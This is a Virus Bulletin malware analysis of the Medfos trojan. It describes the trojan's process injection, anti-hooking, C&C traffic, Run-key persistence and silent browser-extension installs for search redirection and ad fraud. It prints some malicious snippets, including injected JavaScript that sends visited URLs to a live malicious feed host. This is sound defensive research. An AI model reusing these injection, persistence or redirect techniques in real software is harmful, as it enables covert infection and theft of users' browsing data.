<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Medfosâ€“ an all-purpose redirector</title>
<meta name="description" content="Medfos is a heavily obfuscated trojan family which downloads modules capable of redirecting search engine results in the most popular browsers. Benjamin Chang and Neo Tan dissect the way the Medfos downloader deploys its downloaded modules, and the function of each." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1657;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201401-Medfos"></a>Medfos&ndash; an all-purpose redirector</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2014-01-07</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="surname">Benjamin Chang</span></h3><span class="orgname">Fortinet</span>, <span class="orgdiv">Canada</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Neo</span> <span class="surname">Tan</span></h3><span class="orgname">Fortinet</span>, <span class="orgdiv">Canada</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Medfos is a heavily obfuscated trojan family which downloads modules capable of redirecting search engine results in the most popular browsers. Benjamin Chang and Neo Tan dissect the way the Medfos downloader deploys its downloaded modules, and the function of each.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2014 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-2440" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-2440" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id4447717"></a></span></dt><dt><span class="sect1"><a href="#id2348091">The DLL downloader</a></span></dt><dt><span class="sect1"><a href="#id4710938">DLL module - redirector</a></span></dt><dt><span class="sect1"><a href="#id3975341">Chrome redirect</a></span></dt><dt><span class="sect1"><a href="#id4230767">Firefox redirect</a></span></dt><dt><span class="sect1"><a href="#id2475559">Internet Explorer redirect</a></span></dt><dt><span class="sect1"><a href="#id4427709">Conclusion</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4447717"></a></h2></div></div></div><p>Medfos is a heavily obfuscated trojan family which downloads modules capable of redirecting search engine results in the most popular browsers, including <span class="emphasis"><em>Chrome</em></span>, <span class="emphasis"><em>Firefox</em></span> and <span class="emphasis"><em>Internet Explorer</em></span>. Its main module, the downloader, was found to be distributed via the Sasfis botnet. This article dissects the way the Medfos downloader deploys its downloaded modules, and the function of each.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2348091"></a>The DLL downloader</h2></div></div></div><p>The outermost layer of the Medfos downloader behaves as a code injector to the msiexec.exe process, where it performs its main payload. The assembly code is heavily obfuscated. It uses a combination of encrypted strings, dummy calls, junk code and opaque predicates to cause <span class="emphasis"><em>IDA</em></span> functions to be chopped up inaccurately in the default setting, and causes the function graph overview window to be too complex to navigate accurately if the &lsquo;Create functions if call is present&rsquo; option is turned off.</p><p>First, Medfos obtains the handle of %system%/msiexec.exe by calling NtOpenFile. Prior to creating a process using the newly acquired file handle, the ZwCreateSection and NtMapViewOfSection routines are called to obtain a mapped view of msiexec.exe where the malware prepares and inserts decoded chunks of malicious code. CreateProcessInternalW is then used to create an instance of the msiexec.exe process in a suspended state. In between the typical NtGetContextThread and NtResumeThread API calls, the code injection is performed by two NtMapViewOfSection calls. The first NtMapViewOfSection call maps the bulk of the malicious code into the suspended process, while the second changes the entry point bytes of the suspended process to a jump into the malicious code.</p><p>As the host process resumes the thread of the injected msiexec.exe, the injected process will perform its function as a downloader. It resolves some critical APIs and employs an anti-API hooking technique. As shown in <a href="#figure.1">Figure 1</a>, the first five instructions of InternetOpenURL are copied to an allocated space at memory location 0x9400A0. When the trojan calls InternetOpenURL, it calls location 0x9400A0, which is followed by a jump to the sixth instruction of the original InternetOpenURL call, 0x771C5A6A. Thus, it avoids the API hook that hooks the first five instructions of the original call.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Anti-API hook." src="/uploads/images/figures/2014/01/Medfos-2.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Anti-API hook.</b></p></div><p>(To view a larger version of Figure 1 please click <a href="/uploads/images/figures/2014/01/Medfos-2-large.jpg" target="_top">here</a>.)</p><p>After some preparation, the downloader checks for network connectivity by attempting to connect to <span class="emphasis"><em>Google</em></span>. If a network connection is verified, it issues a DNS query to cdn169.filesnetupload.com, which at the time of writing this article, returns the IP 78.140.131.159. However, the malware subsequently connects to the C&amp;C server at 78.131.140.159 and reads a maximum of 0x108FF0 bytes of data. The IP of the server is a string decrypted at runtime, and the DNS query is probably a smokescreen intended to distract users and malware analysts. As shown in <a href="#figure.2">Figure 2</a>, when communicating with the C&amp;C server, the host is set as www.microsoft.com to further confuse the user. The data sent to the server is a hard-coded string pretending to be downloading a file from a legitimate site which has nothing to do with the C&amp;C server.</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="The host is set to www.microsoft.com, but the Get message is sent to IP 78.140.131.159." src="/uploads/images/figures/2014/01/Medfos-3.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;The host is set to www.microsoft.com, but the Get message is sent to IP 78.140.131.159.</b></p></div><p>The response from the C&amp;C server is encrypted with a simplified version of the Tiny Encryption Algorithm (TEA), with all four cache keys hard-coded to be 0x12345678. As illustrated in <a href="#figure.3">Figure 3</a> and <a href="#table.1">Table 1</a>, the server response contains two structures, each with a five-DWORD header and the body content of a portable executable (PE).</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="Decoded responses." src="/uploads/images/figures/2014/01/Medfos-4.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;Decoded responses.</b></p></div><div class="table"><a id="table.1"></a><table border="1" summary="Structure of the decoded response."><colgroup><col /><col /><col /></colgroup><thead><tr><th align="center">DWORD</th><th align="center">Use</th><th align="center">Note</th></tr></thead><tbody><tr><td>1</td><td>Reserved</td><td>Not used</td></tr><tr><td>2</td><td>A checksum of the PE contained in the current structure</td><td>The checksum is a simple summation of all bytes in the PE</td></tr><tr><td>3</td><td>Size of the PE in current structure</td><td>&nbsp;</td></tr><tr><td>4</td><td>Hash of export name to be called</td><td>The checksum pseudo algorithm: For C = each character in NAME, CKM = CKM ror 7 CKM = CKM ^ C</td></tr><tr><td>5</td><td>End of this structure</td><td>Absolute number of bytes from the beginning of buffer</td></tr><tr><td>6+</td><td>The PE bytes</td><td>&nbsp;</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;Structure of the decoded response.</b></p></div><p>Note that, as shown in <a href="#figure.3">Figure 3</a> and <a href="#table.1">Table 1</a>, the fourth DWORD is the hash of the DLL export name, which will be called by the downloader and the run key set up by the DLL itself. The downloaded DLL may be different each time as the server always responds with the newest variant.</p><p>The downloaded DLL is loaded and initialized using ntdll.LdrLoadDll(). While most parts of the DLLs are encrypted, initializing the DLLs performs the decryption. To start the payload of the downloaded DLLs, the export defined by the fourth DWORD is called. When called within the host Medfos downloader, a constant is pushed as the argument to the export function. By matching the argument with the constant, the downloaded module is able to determine whether it is being invoked &lsquo;legitimately&rsquo;. Called within the downloader, the DLL first drops a copy of itself into %Application Data% with a name consisting of six randomly generated alphabet characters. Then it adds the following key in the registry entry under &lsquo;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&rsquo; to make sure it is executed at start up:</p><pre class="programlisting">&lt;DLL name&gt; = rundll32.exe &lt;DLL path and DLL name&gt;, &lt;ExportName&gt;</pre><p>Just before returning from the export function, to execute the DLL, CreateProcessW is called with the same rundll32.exe command line as the registry key just created.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4710938"></a>DLL module - redirector</h2></div></div></div><p>One of the downloaded DLL modules is a search result redirector for <span class="emphasis"><em>Google Chrome</em></span>, <span class="emphasis"><em>Mozilla Firefox </em></span>and <span class="emphasis"><em>Internet Explorer</em></span>. <a href="#figure.4">Figure 4</a> shows search result redirection behaviour under<span class="emphasis"><em> Internet Explorer</em></span>, while Figure 5 displays the network traffic generated during the multi-stage redirection process. As we have mentioned, loading the DLL module decrypts the DLL, and the decrypted DLL module is equipped with a different style of code obfuscation technique from its downloader. The strings are decrypted only immediately prior to their use and are erased straight after use. The APIs are also resolved only at runtime.</p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Search result redirection. Notice that the topic of the redirected page is related to the search term." src="/uploads/images/figures/2014/01/Medfos-5.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Search result redirection. Notice that the topic of the redirected page is related to the search term.</b></p></div><p>(To view a larger version of Figure 4 please click <a href="/uploads/images/figures/2014/01/Medfos-5-large.jpg" target="_top">here</a>.)</p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="Result of clicking on a link after searching for the term &lsquo;penny stock&rsquo;." src="/uploads/images/figures/2014/01/Medfos-6.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;Result of clicking on a link after searching for the term &lsquo;penny stock&rsquo;.</b></p></div><p>(To view a larger version of Figure 5 please click <a href="/uploads/images/figures/2014/01/Medfos-6-large.jpg" target="_top">here</a>.)</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3975341"></a>Chrome redirect</h2></div></div></div><p>After the redirector DLL module is executed, it drops and installs a .crx <span class="emphasis"><em>Google Chrome</em></span> extension package. The extension package is first decoded and dropped into %Administrator\Local Settings\Application Data% with a randomly generated name in GUID (globally unique identifier) format. Then, to trigger installation of the <span class="emphasis"><em>Chrome</em></span> extension, the following registry key is added [<span class="citation"><a href="#citation.1">1</a></span>]:</p><pre class="programlisting">HKLM\Software\Google\Chrome\Extensions\&lt;32 randomly generated lower case characters&gt; 
path = &lt;full path of the .crx file&gt;
</pre><p>The strings contained in the <span class="emphasis"><em>Chrome</em></span> extension scripts are encoded. The pseudo code of the decryption routine is as follows:</p><pre class="programlisting">Key = 0;
OutString = &ldquo;&rdquo;;
For Byte in Input:
  Byte = Byte ^ (Key&amp;0xFF);
  OutString = OutString + toChar(Byte);
  Key++;
End For
Return OutString;
</pre><p>The <a href="/virusbulletin/2014/01/medfos-all-purpose-redirector-appendix
" target="_top">Appendix</a> contains the de-obfuscated equivalent of the scripts contained within the .crx package. Once installed, the extension parses the document.location.href using regular expression matching. Depending on the situation, one of the following two actions might be triggered:</p><div class="orderedlist"><ol type="1"><li><p>If <span class="emphasis"><em>Google Instant </em></span>search is detected, the script injected is:</p><pre class="programlisting">http://disable-instant-search.com/js/disable.js</pre><p>This contains the following JavaScript:</p><pre class="programlisting">try {
 var Links = document.getElementsByTagName(&lsquo;a&rsquo;);
 var f = 0;
 for (var i = 0; f == 0 &amp;&amp; i &lt; Links.length; i++) {
  if (Links[i].href.indexOf(&lsquo;/setprefs?&rsquo;) != -1) {
   var t = Links[i].href.search(/sig=([^&amp;]+)/);
   if (t) {
    t = RegExp.$1;
    t = &lsquo;/setprefs?&amp;sig=&rsquo; + t + &lsquo;&amp;suggon=2&rsquo;;
    var req = new XMLHttpRequest();
    req.open(&lsquo;GET&rsquo;, t);
    req.send();
    f = 1;
   }
  }
 }
} catch (err) {}
</pre></li><li><p>If a link to a search result of one of the major search engines is identified, the injected script would be:</p><pre class="programlisting">ss+&rdquo;?type=&rdquo;+k3+&rdquo;&amp;user-agent=Mozilla%2F5.0+%28Windows+NT+5.1%29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Chrome%2
F12.0.742.112+Safari%2F534.30&amp;ip=&rdquo;+p+&rdquo;&amp;ref=&rdquo;+encodeURIComponent(k2)+&rsquo;&amp;&rsquo;+kladsjnkf</pre><p>Where:</p><p><span class="emphasis"><em>ss</em></span> = &lsquo;http://chrome-revision.com/feed&rsquo;</p><p><span class="emphasis"><em>k3</em></span> = &lsquo;search&rsquo; if searching in <span class="emphasis"><em>Google</em></span>,<span class="emphasis"><em> Yahoo!</em></span>, <span class="emphasis"><em>Ask</em></span>, <span class="emphasis"><em>Bing</em></span> or <span class="emphasis"><em>AOL</em></span></p><p><span class="emphasis"><em>k3</em></span> = &lsquo;empty&rsquo; if visiting <span class="emphasis"><em>Yahoo!</em></span>, <span class="emphasis"><em>Bing</em></span>, <span class="emphasis"><em>Ask</em></span> or <span class="emphasis"><em>AOL</em></span> but not searching</p><p><span class="emphasis"><em>k2 </em></span>= the current URL</p><p><span class="emphasis"><em>p </em></span>= a randomly generated IP address starting with 84.</p></li></ol></div><p>The &lsquo;http://chrome-revision.com/feed&rsquo; may also return a gzipped script which redirects the page to &lsquo;http://googleads.i.doublee-click.net&rsquo;, as shown in the <a href="/virusbulletin/2014/01/medfos-all-purpose-redirector-appendix
" target="_top">Appendix</a>. At this point, the server at &lsquo;http://googleads.i.doublee-click.net&rsquo; might decide to further redirect the browser to another domain. The choice of redirected target depends on the search term. During the redirecting procedure, the browsing footprint is referred to a legitimate advertisement domain to simulate fake ad-clicks to generate revenue for the author. The network traffic of such a process generated by &lsquo;http://googleads.i.doublee-click.net&rsquo; is illustrated in <a href="#figure.5">Figure 5</a>.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4230767"></a>Firefox redirect</h2></div></div></div><p>If <span class="emphasis"><em>Mozilla Firefox </em></span>is found to be installed, a <span class="emphasis"><em>Firefox</em></span> extension performing the same function as the <span class="emphasis"><em>Chrome</em></span> extension will also be installed. The script contained within the extension is essentially <span class="emphasis"><em>Firefox</em></span> syntax of the same script as the <span class="emphasis"><em>Chrome</em></span> extension. As <span class="emphasis"><em>Firefox</em></span> does not officially advertise a method to install an extension without user confirmation, a more stealthy approach is taken here. To install the <span class="emphasis"><em>Firefox</em></span> extension, the DLL module loads and calls the mozsqlite3.dll library to allow direct modification of the database behind the <span class="emphasis"><em>Firefox</em></span> browser. To be exact, it calls sqlite3_open16 to open the <span class="emphasis"><em>Firefox</em></span> database, followed by a series of sqlite3_exec SQL statements, as shown in <a href="#figure.6">Figure 6</a>, to set up the installation [<span class="citation"><a href="#citation.2">2</a></span>]. The DLL module drops the file %&lt;Firefox extension folder&gt;%&lt;randomly generated GUID&gt;.xpi to complete the installation of the extension. Note that the GUID entered into the <span class="emphasis"><em>Firefox</em></span> sqlite database must match the filename of the .xpi file, as shown in <a href="#figure.6">Figure 6</a> and <a href="#figure.7">Figure 7</a>.</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Sqlite3_exec to include required information for Firefox to load an extension. GUID is highlighted in red." src="/uploads/images/figures/2014/01/Medfos-7.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Sqlite3_exec to include required information for Firefox to load an extension. GUID is highlighted in red.</b></p></div><p>(To view a larger version of Figure 6 please click <a href="/uploads/images/figures/2014/01/Medfos-7-large.jpg" target="_top">here</a>.)</p><div class="figure"><a id="figure.7"></a><div class="mediaobject"><img alt="Creating/dropping the actual .xpi file. GUID is highlighted in red." src="/uploads/images/figures/2014/01/Medfos-8.jpg" /></div><p class="title"><b>Figure&nbsp;7.&nbsp;Creating/dropping the actual .xpi file. GUID is highlighted in red.</b></p></div><p>(To view a larger version of Figure 7 please click <a href="/uploads/images/figures/2014/01/Medfos-8-large.jpg" target="_top">here</a>.)</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2475559"></a>Internet Explorer redirect</h2></div></div></div><p>The DLL module also implements a similar ad-clicking and redirecting behaviour for <span class="emphasis"><em>Internet Explorer</em></span>. However, the implementation for <span class="emphasis"><em>IE</em></span> is a little more involved. First, using CoInitialize and CoCreateInstance, an instance of iexplore.exe is created. Note that this instance of iexplore.exe lurks in the background without a visible window. SetWindowsHookExW is then called with idHook set to WH_GETMESSAGE and HOOKPROC pointing to a harmless container subroutine that eventually calls CallNextHook. The hooked function need not be malicious because the function of this <span class="emphasis"><em>Windows</em></span> hook is to load the DLL module into the lurking iexplore.exe process and, as an artefact, into all other active processes that monitor messages using either PeekMessage or GetMessage. Once the injection is in place, UnhookWindowsHookEx is called to clean up the hook.</p><div class="figure"><a id="figure.8"></a><div class="mediaobject"><img alt="SetWindowsHookExW sets the set_gAMA_fixed export function as HOOKPROC parameter." src="/uploads/images/figures/2014/01/Medfos-9.jpg" /></div><p class="title"><b>Figure&nbsp;8.&nbsp;SetWindowsHookExW sets the set_gAMA_fixed export function as HOOKPROC parameter.</b></p></div><p>(To view a larger version of Figure 8 please click <a href="/uploads/images/figures/2014/01/Medfos-9-large.jpg" target="_top">here</a>.)</p><p>In addition to the search result redirection performed through the server at &lsquo;googleads.doublee-click.net&rsquo;, as illustrated in <a href="#figure.4">Figure 4</a> and <a href="#figure.5">Figure 5</a>, the lurker iexplore.exe simulates another ad clicking action to generate an additional stream of revenue. <a href="#figure.9">Figure 9</a> shows an instance where the URL for a <span class="emphasis"><em>Google</em></span> search result page is referenced to the additional online advertisement domain.</p><div class="figure"><a id="figure.9"></a><div class="mediaobject"><img alt="Redirection with InternetOpenUrlW while searching for the keyword &lsquo;stock&rsquo; in Google. Notice that there is an IP prepended to the normal Google search URL." src="/uploads/images/figures/2014/01/Medfos-10.jpg" /></div><p class="title"><b>Figure&nbsp;9.&nbsp;Redirection with InternetOpenUrlW while searching for the keyword &lsquo;stock&rsquo; in Google. Notice that there is an IP prepended to the normal Google search URL.</b></p></div><p>(To view a larger version of Figure 9 please click <a href="/uploads/images/figures/2014/01/Medfos-10-large.jpg" target="_top">here</a>.)</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4427709"></a>Conclusion</h2></div></div></div><p>The design of the Medfos trojan provides great modularity and extensive security for the DLL modules that it distributes. It is also able to download and deploy an arbitrary number of DLL modules.</p><p>As for the redirector DLL module that we have discussed, its ad-clicker functionality provides a method to generate revenue. It is also possible that the author is using the search engine usage information gathered for some other purpose. While the <span class="emphasis"><em>Internet Explorer</em></span> version of the redirect/ad-clicker functionality causes a major and noticeable slow down in the browser, the <span class="emphasis"><em>Firefox</em></span> and <span class="emphasis"><em>Google Chrome</em></span> extensions are both simple and reliable.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4136168"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] <span class="bibliosource"><a href="https://developer.chrome.com/extensions/external_extensions.html" target="_blank">http://developer.chrome.com/extensions/external_extensions.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] <span class="bibliosource"><a href="http://research.zscaler.com/2012/09/how-to-install-silently-malicious.html" target="_blank">http://research.zscaler.com/2012/09/how-to-install-silently-malicious.html</a></span>.</p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Medfosâ€“ an all-purpose redirector&url=https://www.virusbulletin.com/virusbulletin/2014/01/medfos-all-purpose-redirector"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2014/01/medfos-all-purpose-redirector'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2014/01/medfos-all-purpose-redirector&title=Medfosâ€“ an all-purpose redirector"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2014/01/medfos-all-purpose-redirector&t=Medfosâ€“ an all-purpose redirector"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2014/01/medfos-all-purpose-redirector"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p>Â </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
